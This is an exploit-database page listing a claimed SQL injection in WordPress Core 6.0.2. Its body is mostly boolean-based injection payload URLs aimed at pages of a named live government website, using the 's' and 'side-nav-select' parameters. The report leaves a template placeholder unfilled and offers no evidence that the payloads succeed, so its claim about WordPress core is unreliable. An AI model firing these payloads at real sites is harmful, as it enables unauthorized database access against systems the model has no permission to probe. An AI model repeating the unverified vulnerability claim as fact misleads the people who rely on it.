---
title: WordPress Core 6.0.2 - 'side-nav-select' SQL Injection
url: https://cxsecurity.com/issue/WLB-2023010011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-10
fetch_date: 2025-10-04T03:23:01.568006
---

# WordPress Core 6.0.2 - 'side-nav-select' SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Core 6.0.2 - 'side-nav-select' SQL Injection** **2023.01.09**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [E1.Coders](https://cxsecurity.com/author/E1.Coders/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

There is a sql injection vulnerability in the
WordPress Core 6.0.2 - "side-nav-select" and "s" and "COOKIE" parameter that allows an attacker to easily attack and access the database using the GET SQL INJECTION Boolean Based String method.
Steps To Reproduce:
[add details for how we can reproduce the issue, include key information such as Curl commands, HTTP Request/Response, payload information etc.]
vuln type :SQLInjection
refer address : https://www.wh.gov/briefing-room/
request type : GET
action url : https://www.wh.gov/?s=3796170&side-nav-select=https://www.wh.gov/briefing-room/
parameter : side-nav-select
description : GET SQL INJECTION BooleanBased String
POC : https://www.wh.gov/?s=3796170&side-nav-select=https://www.wh.gov/briefing-room/%27 aNd 6400359=6400359 aNd %276199%27=%276199
vuln type :SQLInjection
refer address : https://www.wh.gov/about-the-white-house/the-grounds/
request type : GET
action url : https://www.wh.gov/?s=2794340&side-nav-select=99999999
parameter : side-nav-select
description : GET SQL INJECTION BooleanBased String
POC : https://www.wh.gov/?s=2794340&side-nav-select=99999999%27/\*\*/oR/\*\*/8412388=8412388/\*\*/aNd/\*\*/%276199%27=%276199
vuln type :SQLInjection
refer address : https://www.wh.gov/
request type : COOKIE
action url : https://www.wh.gov/?s=99999999
parameter : s
description : COOKIE SQL INJECTION BooleanBased String
POC : https://www.wh.gov/?s=99999999%27) oR 3220320=3220320--%20
vuln type : SQLInjection
refer address : https://www.wh.gov/administration/vice-president-harris/
request type : COOKIE
action url : https://www.wh.gov/?side-nav-select=https://www.wh.gov/administration/president-biden/&s=9469962
parameter : s
description : COOKIE SQL INJECTION BooleanBased String
POC : https://www.wh.gov/?side-nav-select=https://www.wh.gov/administration/president-biden/&s=9469962%27)/\*\*/aNd/\*\*/2848463=2848463/\*\*/aNd/\*\*/(%276199%27)=(%276199
vuln type : SQLInjection
refer address : https://www.wh.gov/es/
request type : GET
action url : https://www.wh.gov/es/?s=2163610
parameter : s
description : GET SQL INJECTION BooleanBased Integer
POC : https://www.wh.gov/es/?s=2163610 aNd 4105688=4105688 aNd 7193=7193
vuln type : SQLInjection
refer address : https://www.wh.gov/es/administracion/presidente-biden/
request type : COOKIE
action url : https://www.wh.gov/es/?s=4255397&side-nav-select=https://www.wh.gov/es/administracion/presidente-biden/
parameter : side-nav-select
description : COOKIE SQL INJECTION BooleanBased String
POC : https://www.wh.gov/es/?s=4255397&side-nav-select=https://www.wh.gov/es/administracion/presidente-biden/%27)/\*\*/aNd/\*\*/6672058=6672058/\*\*/aNd/\*\*/(%276199%27)=(%276199

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 20
 -9

68%

32%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top